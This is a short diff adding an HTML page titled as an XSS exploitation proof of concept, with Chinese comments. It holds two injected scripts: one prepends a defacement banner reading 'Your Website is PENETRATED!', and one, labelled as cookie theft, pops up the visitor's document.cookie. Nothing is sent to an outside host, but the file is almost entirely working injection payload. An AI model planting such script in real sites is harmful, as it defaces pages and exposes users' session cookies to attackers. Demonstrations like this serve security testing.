@@ -1,0 +1,20 @@
+<p>
+    XSS Exploitation POC
+</p>
+<!-- 页面样式修改 -->
+<script>
+  let banner = document.createElement('div');
+  banner.style.width = '100%';
+  banner.style.height = '200px';
+  banner.style.background = 'black';
+  banner.style.color = 'white';
+  banner.style.fontSize = '80px';
+  banner.style.textAlign = 'center';
+  banner.appendChild(document.createTextNode('Your Website is PENETRATED!'));
+  document.body.prepend(banner);
+</script>
+
+<!-- Cookie窃取 -->
+<script>
+	alert('当前用户在该站的Cookie为：' + document.cookie);
+</script>
